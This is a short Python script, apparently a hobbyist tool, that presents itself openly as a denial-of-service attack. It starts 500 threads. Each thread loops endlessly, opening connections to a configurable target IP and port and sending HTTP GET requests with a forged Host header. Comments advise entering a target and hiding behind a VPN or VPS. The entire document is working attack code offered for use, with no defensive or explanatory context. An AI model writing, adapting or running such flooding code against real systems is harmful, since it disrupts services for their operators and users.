import socket
import threading

target = '10.0.0.138' # enter target IP
fake_ip = '182.21.20.36' # preferrably use vpn or vps
port = 80 # Enter target port

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    print('DDOS Attack Starting ....................')
    thread.start()

